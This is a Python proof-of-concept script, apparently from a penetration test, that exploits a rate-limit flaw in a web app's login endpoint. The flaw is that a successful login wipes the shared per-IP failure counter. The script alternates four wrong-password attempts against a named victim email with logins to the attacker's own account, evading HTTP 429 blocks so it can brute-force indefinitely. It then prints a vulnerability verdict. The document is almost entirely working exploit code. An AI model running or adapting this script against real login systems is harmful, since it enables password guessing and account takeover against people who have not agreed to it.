#!/usr/bin/env python3
"""
AUTH-VULN-03: Rate limit bypass via successful login reset.

How the vulnerability works (server/routes.ts):

  checkRateLimit(ip):
    entry = loginAttempts.get(ip)
    if (!entry || now > entry.resetAt):
        loginAttempts.set(ip, { count: 1, resetAt: now + 15min })
        return true
    if entry.count >= RATE_LIMIT_MAX(5):
        return false   ← triggers HTTP 429
    entry.count++
    return true

  resetRateLimit(ip):
    loginAttempts.delete(ip)   ← ENTIRE counter deleted on success

  resetRateLimit is called after a SUCCESSFUL authentication on BOTH
  /api/client/login (line 876) and /api/admin/login (line 929).

  Both endpoints share the same in-memory Map keyed by IP address.

Attack cycle arithmetic:
  counter=0  →  fail (→1) → fail (→2) → fail (→3) → fail (→4)
             →  attacker_success: checkRateLimit (→5, passes because 4<5)
                                  resetRateLimit (→ deleted, counter=0)
  counter=0  →  fail (→1) → fail (→2) → fail (→3) → fail (→4)
             →  attacker_success: checkRateLimit (→5, passes)
                                  resetRateLimit (→ deleted, counter=0)
  ... indefinitely

Without the bypass: fail×5 fills counter to 5; attempt 6 hits
entry.count >= 5 → returns false → HTTP 429.

The bypass works by never letting the counter reach 5 before wiping it.
"""

import json
import urllib.request
import urllib.error
from datetime import datetime

BASE_URL = "http://host.docker.internal:3000"

ATTACKER_EMAIL    = "idor.test@attacker.com"
ATTACKER_PASSWORD = "TestPassword123"
ATTACKER_ENDPOINT = "/api/client/login"

VICTIM_EMAIL    = "gustavo@skylineip.com.br"
VICTIM_ENDPOINT = "/api/client/login"

# Large pool so every attempt uses a unique wrong password
WRONG_PASSWORDS = [f"WrongPass{i:03d}" for i in range(1, 50)]


# ── helpers ───────────────────────────────────────────────────────────────────

def login(endpoint: str, email: str, password: str) -> tuple[int, dict | str]:
    url = BASE_URL + endpoint
    payload = json.dumps({"email": email, "senha": password}).encode()
    req = urllib.request.Request(
        url, data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            try:
                return resp.status, json.loads(raw)
            except json.JSONDecodeError:
                return resp.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, raw


def snippet(body: dict | str, max_len: int = 100) -> str:
    text = json.dumps(body) if isinstance(body, dict) else str(body)
    return text[:max_len] + ("..." if len(text) > max_len else "")


def ts() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


SEP = "─" * 82


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    print(SEP)
    print("AUTH-VULN-03  Rate Limit Bypass via Successful Login Reset")
    print(f"Started : {datetime.now().isoformat()}")
    print(f"Victim  : {VICTIM_EMAIL}  (brute-force target)")
    print(f"Attacker: {ATTACKER_EMAIL}  (owns valid credentials)")
    print(SEP)

    pw_idx = 0

    # ── Phase A: bypass cycles FIRST (while counter is fresh) ─────────────────
    #
    # We run the bypass demonstration before any confirmatory testing so we
    # never accidentally saturate the counter before the cycles run.
    #
    # Structure:
    #   Pre-clear  → attacker login  (counter: X → 0)
    #   Cycle ×3   → 4 FAIL_VICTIM + 1 SUCCESS_OWN per cycle
    #
    print("\n[PRE-CLEAR]  Wipe any residual counter via attacker successful login")
    status, body = login(ATTACKER_ENDPOINT, ATTACKER_EMAIL, ATTACKER_PASSWORD)
    if status == 200:
        print(f"  [OK] [{ts()}] HTTP 200 — counter wiped. Ready.")
    else:
        print(f"  [BLOCKED] [{ts()}] HTTP {status} — {snippet(body)}")
        print()
        print("  Rate limit is still active from a previous run.")
        print("  The window is 15 minutes. Please wait and retry.")
        return

    # ── Phase A: 3 bypass cycles ──────────────────────────────────────────────
    CYCLES = 3
    FAILS_PER_CYCLE = 4

    print(f"\n[PHASE A]  Bypass demonstration — {CYCLES} cycles × "
          f"({FAILS_PER_CYCLE} × FAIL_VICTIM  +  1 × SUCCESS_OWN)")
    print()
    print("  Each cycle: 4 wrong-password attempts keep counter at 4,")
    print("  then attacker's successful login passes (4<5) and wipes counter.")
    print()

    cycle_victim_attempts = 0
    cycle_victim_429s     = 0
    cycle_resets_ok       = 0
    cycle_resets_fail     = 0

    all_rows = []  # for tabular summary

    for cycle in range(1, CYCLES + 1):
        print(f"  ┌── Cycle {cycle}/{CYCLES} {'─'*60}")

        # 4 failed attempts (counter goes 0→1→2→3→4; all pass checkRateLimit)
        for attempt in range(1, FAILS_PER_CYCLE + 1):
            pw = WRONG_PASSWORDS[pw_idx % len(WRONG_PASSWORDS)]; pw_idx += 1
            status, body = login(VICTIM_ENDPOINT, VICTIM_EMAIL, pw)
            cycle_victim_attempts += 1
            is_429 = status == 429
            if is_429:
                cycle_victim_429s += 1
            tag = "429-BLOCKED" if is_429 else "FAIL_VICTIM"
            all_rows.append((cycle, attempt, "FAIL_VICTIM", VICTIM_EMAIL, pw, status))
            print(f"  │  [{tag}] [{ts()}] cycle={cycle} attempt={attempt}/{FAILS_PER_CYCLE} "
                  f"pw={pw} → HTTP {status}")
            print(f"  │           {snippet(body)}")

        # Successful attacker login → counter: 4→5 (passes), resetRateLimit → 0
        status, body = login(ATTACKER_ENDPOINT, ATTACKER_EMAIL, ATTACKER_PASSWORD)
        if status == 200:
            cycle_resets_ok += 1
            tag = "SUCCESS_OWN"
        else:
            cycle_resets_fail += 1
            tag = f"RESET-FAIL"
        all_rows.append((cycle, 5, "SUCCESS_OWN", ATTACKER_EMAIL, ATTACKER_PASSWORD, status))
        print(f"  └  [{tag}] [{ts()}] cycle={cycle} reset → HTTP {status} | {snippet(body)}")
        print()

    # ── Phase B: confirm rate limit IS active (now counter is at 0 post-reset) ─
    print(f"[PHASE B]  Confirm rate limit fires normally (counter is 0 after Phase A)")
    print("           Make 5 failed attempts then a 6th to trigger 429")
    print()

    baseline_victim_attempts = 0
    baseline_429 = False

    for i in range(1, 7):
        pw = WRONG_PASSWORDS[pw_idx % len(WRONG_PASSWORDS)]; pw_idx += 1
        status, body = login(VICTIM_ENDPOINT, VICTIM_EMAIL, pw)
        baseline_victim_attempts += 1
        tag = "429-RATE-LIMITED" if status == 429 else "FAIL_VICTIM"
        print(f"  [{tag}] [{ts()}] baseline attempt {i}/6 pw={pw} → HTTP {status}")
        print(f"           {snippet(body)}")
        if status == 429:
            baseline_429 = True
            print(f"\n  [+] Rate limit confirmed — blocked on attempt {i} (counter ≥ 5)")
            break

    # ── Results table ─────────────────────────────────────────────────────────
    print(f"\n{SEP}")
    print("ATTEMPT LOG (Phase A bypass cycles)")
    print(SEP)
    print(f"  {'Cycle':>5}  {'Att':>3}  {'Type':<12}  {'Email':<30}  {'Password':<14}  {'HTTP'}")
    print(f"  {'─'*5}  {'─'*3}  {'─'*12}  {'─'*30}  {'─'*14}  {'─'*4}")
    for (cyc, att, typ, email, pw, http) in all_rows:
        blocked = " ← BLOCKED" if http == 429 else ""
        print(f"  {cyc:>5}  {att:>3}  {typ:<12}  {email:<30}  {pw:<14}  {http}{blocked}")

    # ── Final summary ─────────────────────────────────────────────────────────
    unblocked = cycle_victim_attempts - cycle_victim_429s
    expected  = CYCLES * FAILS_PER_CYCLE  # 12

    print(f"\n{SEP}")
    print("RESULTS SUMMARY")
    print(SEP)
    print(f"  Bypass cycles completed                           : {CYCLES}")
    print(f"  FAIL_VICTIM attempts in bypass cycles             : {cycle_victim_attempts}")
    print(f"  429 blocks on victim in bypass cycles             : {cycle_victim_429s}")
    print(f"  FAIL_VICTIM bypass attempts WITHOUT 429           : {unblocked} / {expected} expected")
    print(f"  Successful attacker resets (HTTP 200)             : {cycle_resets_ok}")
    print(f"  Failed attacker resets                            : {cycle_resets_fail}")
    print(f"  Rate limit confirmed active (Phase B 429 fired)   : {'YES' if baseline_429 else 'NO'}")
    print()

    if cycle_victim_429s == 0 and unblocked == expected and baseline_429:
        print("  [VULNERABLE]  AUTH-VULN-03 CONFIRMED")
        print()
        print(f"  All {unblocked} bypass-cycle FAIL_VICTIM attempts completed with ZERO 429 blocks.")
        print("  The rate limit IS active (Phase B confirms) yet was bypassed entirely.")
        print()
        print("  Root cause (server/routes.ts):")
        print("    resetRateLimit(ip) on line 876 calls loginAttempts.delete(ip),")
        print("    completely wiping the per-IP attempt counter on any successful login.")
        print("    Since both attacker and victim use the same IP-keyed counter, the")
        print("    attacker's successful login resets the failure count for all accounts.")
        print()
        print("  Impact: unlimited brute-force against victim accounts with no rate-limit")
        print("  protection, as long as attacker holds one valid credential pair.")
    elif cycle_victim_429s == 0 and not baseline_429:
        print("  [INCONCLUSIVE] No 429 in bypass cycles, but rate limit not confirmed active.")
    elif cycle_victim_429s > 0:
        print(f"  [PARTIAL] {cycle_victim_429s} requests were blocked. Bypass partially effective.")
    print(SEP)
    print(f"Finished: {datetime.now().isoformat()}")


if __name__ == "__main__":
    main()
